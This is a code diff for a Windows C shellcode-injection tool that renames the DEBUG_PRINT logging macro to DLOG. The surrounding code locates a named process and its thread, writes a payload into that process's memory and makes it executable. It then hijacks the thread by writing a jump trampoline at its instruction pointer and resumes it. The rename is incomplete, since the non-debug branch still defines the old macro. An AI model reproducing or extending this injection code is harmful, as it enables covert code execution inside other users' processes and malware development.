@@ -16,7 +16,7 @@
 #define _DBG
 
 #ifdef _DBG
-#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
+#define DLOG(x, ...) printf(x, ##__VA_ARGS__)
 #define _INT getchar()
 #else
 #define DEBUG_PRINT(x, ...)
@@ -41,13 +41,13 @@ BOOL GetRemoteProcHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcId, OUT HANDL
 
 	if (INVALID_HANDLE_VALUE == hSnapShot)
 	{
-		DEBUG_PRINT("[*]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[*]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
 		goto _endfunc;
 	}
 
 	if (!Process32First(hSnapShot, &stProc))
 	{
-		DEBUG_PRINT("[-]Process32First failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[-]Process32First failed with error: 0x%.8x\n", GetLastError());
 		goto _endfunc;
 	}
 
@@ -76,7 +76,7 @@ BOOL GetRemoteProcHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcId, OUT HANDL
 			*dwProcId = stProc.th32ProcessID;
 			*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, stProc.th32ProcessID);
 			if (NULL == *hProc)
-				DEBUG_PRINT("[-]OpenProcess failed with error: 0x%.8x\n", GetLastError());
+				DLOG("[-]OpenProcess failed with error: 0x%.8x\n", GetLastError());
 			break;
 		}
 	} while (Process32Next(hSnapShot, &stProc));
@@ -102,13 +102,13 @@ BOOL GetRemoteThrdHandle(IN DWORD dwProcId, OUT DWORD* dwThrdId, OUT HANDLE* hTh
 
 	if (INVALID_HANDLE_VALUE == hSnapShot)
 	{
-		DEBUG_PRINT("[-]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[-]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
 		goto _endfunc;
 	}
 
 	if (!Thread32First(hSnapShot, &stThEntry))
 	{
-		DEBUG_PRINT("[-]Thread32First failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[-]Thread32First failed with error: 0x%.8x\n", GetLastError());
 		goto _endfunc;
 	}
 
@@ -120,7 +120,7 @@ BOOL GetRemoteThrdHandle(IN DWORD dwProcId, OUT DWORD* dwThrdId, OUT HANDLE* hTh
 			*hThrd = OpenThread(THREAD_ALL_ACCESS, FALSE, stThEntry.th32ThreadID);
 
 			if (NULL == *hThrd)
-				DEBUG_PRINT("[-]OpenThread failed with error: 0x%.8x\n", GetLastError());
+				DLOG("[-]OpenThread failed with error: 0x%.8x\n", GetLastError());
 
 			break;
 		}
@@ -145,26 +145,26 @@ BOOL InjectRemoteProc(IN HANDLE hProc, IN PBYTE pShellcode, IN SIZE_T sShellcod,
 
 	if (NULL == *ppAddr)
 	{
-		DEBUG_PRINT("[-]VirtualAllocEx failed with error: %d\n", GetLastError());
+		DLOG("[-]VirtualAllocEx failed with error: %d\n", GetLastError());
 		return FALSE;
 	}
 
-	DEBUG_PRINT("[*]Payload buffer address @ ==========> 0x%p\n", *ppAddr);
+	DLOG("[*]Payload buffer address @ ==========> 0x%p\n", *ppAddr);
 
-	DEBUG_PRINT("[*]Press <Enter> to write payload ..");
+	DLOG("[*]Press <Enter> to write payload ..");
 	_INT;
 
 	if (!WriteProcessMemory(hProc, *ppAddr, pShellcode, sShellcod, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sShellcod)
 	{
-		DEBUG_PRINT("[-]WriteProcessMemory failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[-]WriteProcessMemory failed with error: 0x%.8x\n", GetLastError());
 		return FALSE;
 	}
 
-	DEBUG_PRINT("[*]Done ... %d bytes of payload written ...\n", sNumberOfBytesWritten);
+	DLOG("[*]Done ... %d bytes of payload written ...\n", sNumberOfBytesWritten);
 
 	if (!VirtualProtectEx(hProc, *ppAddr, sShellcod, PAGE_EXECUTE_READWRITE, &dwOldProtection))
 	{
-		DEBUG_PRINT("[-]VirtualProtectEx failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[-]VirtualProtectEx failed with error: 0x%.8x\n", GetLastError());
 		return FALSE;
 	}
 
@@ -183,15 +183,15 @@ BOOL HijackThread(IN HANDLE hProc, IN HANDLE hThrd, IN PVOID pAddr)
 
 	if (!GetThreadContext(hThrd, &ThreadCtx))
 	{
-		DEBUG_PRINT("[-]GetThreadContext failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[-]GetThreadContext failed with error: 0x%.8x\n", GetLastError());
 		return FALSE;
 	}
 
 	// get current RIP address
 	DWORD64 curRIP = ThreadCtx.Rip;
-	DEBUG_PRINT("[*]RIP @ ===========> 0x%p \n", curRIP);
+	DLOG("[*]RIP @ ===========> 0x%p \n", curRIP);
 
-	DEBUG_PRINT("[*]Press Enter to write trampoline ...");
+	DLOG("[*]Press Enter to write trampoline ...");
 	_INT;
 
 	unsigned char trmpl[] = {
@@ -202,19 +202,19 @@ BOOL HijackThread(IN HANDLE hProc, IN HANDLE hThrd, IN PVOID pAddr)
 	*(UINT_PTR*)(trmpl + 2) = (UINT_PTR)pAddr;
 	//for (DWORD i = 0; i < sizeof(trampoline); i++)
 	//{
-	//	DEBUG_PRINT("0x%.2x, ", trampoline[i]);
+	//	DLOG("0x%.2x, ", trampoline[i]);
 	//}
 	if (!WriteProcessMemory(hProc, curRIP, trmpl, sizeof(trmpl), &sBytesWritten))
 	{
-		DEBUG_PRINT("[-]Write trampoline failed with error: 0x%.8x\n", GetLastError());
+		DLOG("[-]Write trampoline failed with error: 0x%.8x\n", GetLastError());
 		return FALSE;
 	}
 
 	FlushInstructionCache(hProc, curRIP, sizeof(trmpl));
 
-	DEBUG_PRINT("[*]Done ... %d bytes of trampoline written ...\n", sBytesWritten);
+	DLOG("[*]Done ... %d bytes of trampoline written ...\n", sBytesWritten);
 
-	DEBUG_PRINT("[*]Press <Enter> to resume thread ...");
+	DLOG("[*]Press <Enter> to resume thread ...");
 	_INT;
 
 	ResumeThread(hThrd);
@@ -232,52 +232,52 @@ int wmain(int argc, wchar_t** argv)
 
 	if (argc < 2)
 	{
-		DEBUG_PRINT(L"[-]Usage: \"%ws\" <Process Name> \n", argv[0]);
+		DLOG(L"[-]Usage: \"%ws\" <Process Name> \n", argv[0]);
 		return -1;
 	}
 
-	DEBUG_PRINT("[*]Trageting process: \"%ws\" ...\n", argv[1]);
+	DLOG("[*]Trageting process: \"%ws\" ...\n", argv[1]);
 
 	if (!GetRemoteProcHandle(argv[1], &dwProcId, &hProc))
 	{
-		DEBUG_PRINT("[-]Process not found ...\n");
+		DLOG("[-]Process not found ...\n");
 		return -1;
 	}
 
-	DEBUG_PRINT("[*]Found target process @ ==========> %d\n", dwProcId);
+	DLOG("[*]Found target process @ ==========> %d\n", dwProcId);
 
-	DEBUG_PRINT("[*]Get remote thread handle ... \n");
+	DLOG("[*]Get remote thread handle ... \n");
 
 	if (!GetRemoteThrdHandle(dwProcId, &dwThrdId, &hThrd))
 	{
-		DEBUG_PRINT("[-]No thread found ...\n");
+		DLOG("[-]No thread found ...\n");
 		return -1;
 	}
 
-	DEBUG_PRINT("[*]Found target thread @ ==========> %d\n", dwThrdId);
+	DLOG("[*]Found target thread @ ==========> %d\n", dwThrdId);
 
-	DEBUG_PRINT("[*]Inject shellcode ...\n");
+	DLOG("[*]Inject shellcode ...\n");
 
 	if (!InjectRemoteProc(hProc, payload, sizeof(payload), &pAddr))
 	{
-		DEBUG_PRINT("[-]Inject shellcode failed ...\n");
+		DLOG("[-]Inject shellcode failed ...\n");
 		return -1;
 	}
 
-	DEBUG_PRINT("[*]Hijacking remote thread ... \n");
+	DLOG("[*]Hijacking remote thread ... \n");
 
 	if (!HijackThread(hProc, hThrd, pAddr))
 	{
-		DEBUG_PRINT("[-]Hijacking remote thread failed ...\n");
+		DLOG("[-]Hijacking remote thread failed ...\n");
 		return -1;
 	}
 
-	DEBUG_PRINT("[*]DONE ...\n");
+	DLOG("[*]DONE ...\n");
 
 	CloseHandle(hThrd);
 	CloseHandle(hProc);
 
-	DEBUG_PRINT("[*]Press <Enter> to quit ...");
+	DLOG("[*]Press <Enter> to quit ...");
 	_INT;
 
 	return 0;
